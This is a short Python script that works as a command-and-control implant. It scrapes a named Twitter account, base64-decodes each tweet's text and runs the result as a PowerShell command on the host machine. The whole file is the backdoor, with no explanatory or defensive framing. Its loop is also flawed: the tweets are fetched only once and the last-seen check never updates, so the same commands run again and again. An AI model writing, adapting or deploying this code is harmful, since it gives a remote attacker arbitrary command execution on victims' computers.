import time,os,urllib,base64,subprocess
from bs4 import BeautifulSoup as mySoup

html = urllib.urlopen('https://twitter.com/S1mpleCC')
soup = mySoup(html,"html.parser")
tweets = soup.findAll('li',{"class":'js-stream-item'})
last_tweet = ""
while True :
    for tweet in tweets:
        if tweet.find('p',{"class":'tweet-text'}):
            text = str(tweet.find('p',{"class":'tweet-text'}).get_text())
            shell = base64.b64decode(text)

            if last_tweet != shell :
                   
                os.system('powershell.exe ' + shell)
